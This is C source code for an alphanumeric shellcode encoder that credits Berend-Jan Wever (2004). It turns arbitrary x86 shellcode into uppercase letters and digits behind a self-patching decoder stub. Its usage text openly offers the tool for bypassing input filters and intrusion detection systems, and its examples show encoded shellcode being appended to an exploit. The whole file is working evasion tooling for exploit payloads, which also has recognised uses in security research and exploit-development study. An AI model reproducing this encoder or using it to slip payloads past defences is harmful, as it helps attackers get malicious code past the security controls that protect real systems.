//#define _debug_
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>

#include "alphanumeric_opcodes_defines.h"
#define IMUL_I8_ "\x6b"
#define CONST_0x10 "\x10"
#define JNE "\x75"

#define XORCODE1 "\x41"
#define xorcode1 0x41
#define XORCODE2 "\x3f"
#define xorcode2 0x3f

/* 
      ,sSSs,,s,  Alpha v0.3 beta.
     SS"  Y$P"
    iS'   dY     Captitalized alphanumeric shellcode encoding.
    YS,  dSb     Copyright (C) 2004 by Berend-Jan Wever.
    `"YSS'"S'    <skylined@edup.tudelft.nl>
*/


struct get_baseaddress_options_struct {
  char* option; // name of option
  char* code; // the code
} get_baseaddress_options[] = {
//   We're using "xor offset(%edx), %al" and similar instructions for xor-
//   patching and decoding the origional code to keep it all alphanumeric.
//   %edx and %ecx must point to the baseaddess of the shellcode, we add one of
//   the following pieces of code to set the %ecx and %edx register.
//   Since offset must be at least 0x30, we can't patch any instructions before
//   baseaddress+0x30 without tricks. We could offcourse just add padding but
//   then we'd have useless bytes in our decoder taking up space. We can also
//   lower %edx and %ecx to reach these otherwise unreachable instructions: The
//   "dec %edx" and "dec %ecx" instructions combine padding and decreasing to
//   reduce the size of the decoder.
  { "eax",     PUSH_EAX POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "ebx",     PUSH_EBX POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "ecx",     DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  DEC_ECX  PUSH_ECX POP_EDX  },
  { "edx",     DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "esp",     PUSH_ESP POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "ebp",     PUSH_EBP POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "esi",     PUSH_ESI POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "edi",     PUSH_EDI POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp-8]", DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  POP_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp-4]", DEC_ESP  DEC_ESP  DEC_ESP  DEC_ESP  POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp]",   POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp+4]", INC_ESP  INC_ESP  INC_ESP  INC_ESP  POP_EDX  DEC_EDX  DEC_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { "[esp+8]", INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  INC_ESP  POP_EDX  DEC_EDX  PUSH_EDX POP_ECX  },
  { NULL, NULL }
};

char* allowed_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
// 'Z' terminates decoding and is thus not allowed.
char* encoded_allowed_chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXY";

char* alpha_decoder_readonly = 
// Asume %edx = %ecx = baseaddress - baseaddress_adjust (see above)

// Get a 0x0 in a register ----------------------------------------------------
      PUSH_ESI                          // %esi = 0x0
      PUSH_ESP
      POP_EAX
      SS XOR32_X_ ESI_MEAX              // xor   %ss:(%eax), %esi

// XOR-patching ---------------------------------------------------------------
      PUSH_ESI
      POP_EAX
      XOR_AL_I_ XORCODE1                // al = xorcode1
      // decode 0x10 for imul instruction
      XOR8_ AL_MEDX_O8_ "a"             // xor %al, offset_0x10(%edx)
      // decode 0x6b for imul instruction
      DEC_EAX DEC_EAX                   // %al = xorcode2 (space saver ;)
      XOR8_ AL_MEDX_O8_ "b"             // xor %al, offset_imul(%edx)
      // decode 0x75 for jne instruction
      XOR8_ AL_MEDX_O8_ "c"             // xor %al, offset_jne(%edx)

      // The "c"(+1) also marks beginning of the decoder loop!

// Decode byte1 into low nibble -----------------------------------------------
      // Read
      PUSH_ESI                          // %eax = 0x0
      POP_EAX
      XOR8_X_ AL_MEDX_O8_ "#"           // xor bufferoffset(%edx), %al  (byte1)
      INC_EDX
      // Decode
      DEC_EAX                           // %al--                      (byte1-1)
      XOR_AL_I_ "\x41"                  // %al ^=0x41               (lownibble)
      // Store
      XOR8_X_ AL_MECX_O8_ "#"            // xor bufferoffset(%ecx), %al
      XOR8_ AL_MECX_O8_ "#"              // xor %al, bufferoffset(%ecx)

// Decode byte2 into high nibble ----------------------------------------------
      // Read and decode in one ;)         imul $0x10, bufferoffset(%edx), %eax
      IMUL_I8_ EAX_MEDX_O8_ "#" CONST_0x10 // %al = byte2 * 0x10  (highnibble)
      INC_EDX
      // Store
      XOR8_ AL_MECX_O8_ "#"              // xor %al, bufferoffset(%ecx)
      INC_ECX

// While loop, checks for terminating 'Z' -------------------------------------
      PUSH_ESI                          // %eax = '0'
      POP_EAX
      XOR_AL_I_ "Z"                     // xor $0x30, %al
      CMP8_ AL_MEDX_O8_ "#"             // cmp %al, bufferoffset(%edx)

      JNE "de";

#ifdef _debug_
  void spaces(int x) {
    while(x-->0) fprintf(stderr, " ");
  }
#endif

void banner() {
  fprintf(stderr,"
______________________________________________________________________________

      ,sSSs,,s,  Alpha v0.3 beta.
     SS\"  Y$P\"
    iS'   dY     Captitalized alphanumeric shellcode encoding.
    YS,  dSb     Copyright (C) 2003, 2004 by Berend-Jan Wever.
    `\"YSS'\"S'    <skylined@edup.tudelft.nl>
______________________________________________________________________________

");
}  
void usage(char* name) {
  int i;
  fprintf(stderr, "
Usage: %s REGISTER|STACK LOCATION [PREFERED CHARS]
  Reads shellcode from stdin and encodes it to stdout to contain only uppercase
  alphanumeric characters (0-9 and A-Z).

  The result consist of a decoder and encoded shellcode data, it is a fully
  working uppercase alphanumeric version of the origional shellcodecode. This
  encoding can be used to bypass filters or IDS systems.

Options
  The decoder needs to know it's exact baseaddress, you can specify where the
  shellcode can get it's baseaddress from. The decoder can use a register or a
  location on the stack to get this value from.
  You can optionaly choose to supply a set of prefered characters. The encoded
  data will contain as many of these characters as possible. You can even supply
  lowercase and non-alphanumeric characters.

Valid options are :
  ", name, strlen(alpha_decoder_readonly));
  for(i=0; get_baseaddress_options[i].option != NULL; i++) {
    if (i>0) fprintf(stderr, ", ");
    fprintf(stderr, "%s", get_baseaddress_options[i].option);
  }
  fprintf(stderr, ".

Examples:
  cat shellcode | %s eax > shellcode_encoded
  cat shellcode | %s esp | test_shellcode stack
  cat shellcode | %s [esp-4] abcdefghijklmnopqrstuvwxyz >> exploit

", name, name, name);
}

int main(int argc, char* argv[]) {
  char* get_baseaddress_code = "";
  int i;
  int input, lownibble, highnibble, lownibble_encoded, highnibble_encoded;

  int offset_xor_patch_0x10, offset_xor_patch_imul, offset_xor_patch_jne,
      offset_start_loop, offset_imul, offset_0x10, offset_jne, offset_buffer, 
      offset_end_loop;
  int jne_byte2;
  int baseaddress_adjust;
#ifdef _debug_
  int origional_code_size, decoder_size, encoded_data_size, total_size;
#endif
  char* prefered_encode_chars = NULL;
  
  struct timeval tv;
  struct timezone tz;
  
  char* alpha_decoder = (char*)malloc(strlen(alpha_decoder_readonly));
  strcpy(alpha_decoder, alpha_decoder_readonly);

  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*tv.tv_usec);

  // Check for paramter count
  if (argc < 2) {
    banner();
    fprintf(stderr, "Error: please supply the baseaddress.\n");
    usage(argv[0]);
    return -1;
  }
  if (argc > 3) {
    banner();
    fprintf(stderr, "Error: too many parameters.\n");
    usage(argv[0]);
    return -1;
  }
  if (argc == 3) {
    prefered_encode_chars = argv[2]; 
    if (strchr(prefered_encode_chars, 'Z') != 0 ) {
      // 'Z' terminates decoding and is thus never allowed.
      banner();
      fprintf(stderr, "Error: allowed characters cannot contain 'Z'\n");
      usage(argv[0]);
      return -1;
    }
  }

  // Read parameter and choose GetPC code
  for(i=0; get_baseaddress_options[i].option != NULL; i++) {
    if (strcasecmp(argv[1], get_baseaddress_options[i].option) == 0 ) {
      get_baseaddress_code = get_baseaddress_options[i].code;
      break;
    }
  }
  if (get_baseaddress_options[i].option == NULL) {
    banner();
    fprintf(stderr, "Error: unknown option '%s'\n", argv[1]);
    usage(argv[0]);
    return -1;
  }

  baseaddress_adjust = 0;
  for(i=0; i<strlen(get_baseaddress_code); i++)
    if (get_baseaddress_code[i] == *DEC_EDX ||
        get_baseaddress_code[i] == *DEC_ECX )
      baseaddress_adjust++;
    

// Most of shit could be done at compile time but it's just way to difficult to
// actually do it then, so we just do all of it here at runtime.
    offset_xor_patch_0x10 = strchr( alpha_decoder, 'a') - (int)alpha_decoder;
    offset_xor_patch_imul = strchr( alpha_decoder, 'b') - (int)alpha_decoder;
    offset_xor_patch_jne  = strchr( alpha_decoder, 'c') - (int)alpha_decoder;
    offset_start_loop     = offset_xor_patch_jne+1;
    offset_imul           = strchr( alpha_decoder, *IMUL_I8_) - (int)alpha_decoder;
    offset_0x10           = strchr( alpha_decoder, *CONST_0x10) - (int)alpha_decoder;
    offset_jne            = strchr( alpha_decoder, *JNE) - (int)alpha_decoder;
    offset_buffer         = offset_jne+1;
    offset_end_loop       = offset_jne+2;
    
    // The code needs to be xor_patched to be alpha numeric
    alpha_decoder[offset_0x10] ^= xorcode1;
    alpha_decoder[offset_imul] ^= xorcode2;
    alpha_decoder[offset_jne] ^= xorcode2;

    // The xor_patches need to know the offset where to patch the code.
    alpha_decoder[offset_xor_patch_0x10] = (char)(strlen(get_baseaddress_code) + offset_0x10 + baseaddress_adjust);
    alpha_decoder[offset_xor_patch_imul] = (char)(strlen(get_baseaddress_code) + offset_imul + baseaddress_adjust);
    alpha_decoder[offset_xor_patch_jne] = (char)(strlen(get_baseaddress_code) + offset_jne + baseaddress_adjust);


    // A lot of instructions in the decoder use the offset of the buffer from
    // the start of the code, adjusted for the "dec %edx" optimization.
    while (strchr( alpha_decoder, '#') != 0) {
      *(char*)strchr( alpha_decoder, '#') = (char)(strlen(get_baseaddress_code) + offset_buffer + baseaddress_adjust);
    }

    // The "jne" loop has a negative offset, which is the first encoded byte in
    // the buffer after the decoder. It will be decoded just in time before
    // this point in the decoder routine is reached.
    jne_byte2 = offset_start_loop - offset_end_loop;
    lownibble = (jne_byte2 & 0xf);
    highnibble = (jne_byte2 & 0xf0) >>4;
    lownibble_encoded = (lownibble ^ 0x41) + 1;
    highnibble_encoded = (highnibble == 0x0 ? 0x50 : highnibble+0x40);
    alpha_decoder[offset_buffer] = (char)lownibble_encoded;
    alpha_decoder[offset_buffer+1] = (char)highnibble_encoded;


#ifdef _debug_
    banner();
    fprintf(stderr, "Decoder map:\n");
    spaces(baseaddress_adjust+strlen(get_baseaddress_code)); fprintf(stderr, "v-Main decoder code (%d bytes).\n", strlen(alpha_decoder));
    spaces(baseaddress_adjust); fprintf(stderr, "v-Get baseaddess code (%d bytes) decreases %%edx by %d.\n", strlen(get_baseaddress_code), -baseaddress_adjust);
    spaces(baseaddress_adjust); fprintf(stderr, "0x0-----0x8-----0x10----0x18----0x20----0x28----0x30----0x38----0x40----0x48\n");
    spaces(baseaddress_adjust); fprintf(stderr, "%s%s\n", get_baseaddress_code, alpha_decoder);
    fprintf(stderr, "%%edx----0x8-----0x10----0x18----0x20----0x28----0x30----0x38----0x40----0x48\n");
    
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_xor_patch_0x10);fprintf(stderr, "^0x%02x: xor patch -> 0x10\n", strlen(get_baseaddress_code)+offset_xor_patch_0x10);
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_xor_patch_imul);fprintf(stderr, "^0x%02x: xor patch -> imul\n", strlen(get_baseaddress_code)+offset_xor_patch_imul);
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_xor_patch_jne);fprintf(stderr, "^0x%02x: xor patch -> jne\n", strlen(get_baseaddress_code)+offset_xor_patch_jne);
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_imul);fprintf(stderr, "^0x%02x: patched imul @ %%edx+0x%02x\n", strlen(get_baseaddress_code)+offset_imul, alpha_decoder[offset_xor_patch_imul]);
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_0x10);fprintf(stderr, "^0x%02x: patched 0x10 @ %%edx+0x%02x\n", strlen(get_baseaddress_code)+offset_0x10, alpha_decoder[offset_xor_patch_0x10]);
    spaces(baseaddress_adjust + strlen(get_baseaddress_code)+offset_jne);fprintf(stderr, "^0x%02x: patched jne @ %%edx+0x%02x\n", strlen(get_baseaddress_code)+offset_jne, alpha_decoder[offset_xor_patch_jne]);
    fprintf(stderr, "Result:\n");
    
#endif

// Check decoder for bad characters:
  for (i=0;i<strlen(alpha_decoder);i++)
    if (!strchr(allowed_chars, alpha_decoder[i])) {
      banner();
      fprintf(stderr, "Build error: The decoder contains bad characters!\n"
                      "byte #%d: 0x%02x\n\n", i, (unsigned int)alpha_decoder[i]);
      return -1;
    }

  // Output decoder:
#ifdef _debug_
    fprintf(stderr, "%s%s", get_baseaddress_code, alpha_decoder);
#endif
  printf("%s%s", get_baseaddress_code, alpha_decoder);

  // Output encoded shellcode:
#ifdef _debug_
  origional_code_size = 0;
#endif
  while ((input = getchar()) != EOF) {
#ifdef _debug_
    origional_code_size++;
#endif
    lownibble = (input & 0x0f);
    highnibble = (input & 0xf0) >> 4;
    lownibble_encoded  = (lownibble ^ 0x41) + 1;

    // the upper 4 bits of highnibble are discarded during decoding, so you can
    // put anything in them as long as it's alphanumeric.
    i = rand() % strlen(encoded_allowed_chars);
    while((encoded_allowed_chars[i] & 0xf) != highnibble) {
      i++; i %= strlen(encoded_allowed_chars);
    }
    highnibble_encoded = encoded_allowed_chars[i];

    if (prefered_encode_chars != NULL) {
      for(i=0;i<strlen(prefered_encode_chars); i++) {
        if ((prefered_encode_chars[i] & 0xf) == highnibble) {
          highnibble_encoded = prefered_encode_chars[i];
          break;
        }
      }
    }

#ifdef _debug_
    fprintf(stderr, "%c%c", lownibble_encoded, highnibble_encoded);
#endif
    printf("%c%c", lownibble_encoded, highnibble_encoded);
  }
  // Output end of data marker:
  printf("Z");
#ifdef _debug_
    fprintf(stderr, "Z\n");
    decoder_size = strlen(get_baseaddress_code)+strlen(alpha_decoder);
    encoded_data_size = origional_code_size*2+1;
    total_size = decoder_size+encoded_data_size;
    fprintf(stderr, "Origional code size     : %4d bytes.\n", origional_code_size);
    fprintf(stderr, "Decoder size            : %4d bytes, %.0f%% of result.\n", decoder_size, (double)100*decoder_size/total_size);
    fprintf(stderr, "Encoded data size       : %4d bytes, %.0f%% of result.\n", encoded_data_size, (double)100*encoded_data_size/total_size);
    fprintf(stderr, "Total encoded code size : %4d bytes, %.0f%% of origional.\n", total_size, (double)100*total_size/origional_code_size);

#endif
  return 0;
}
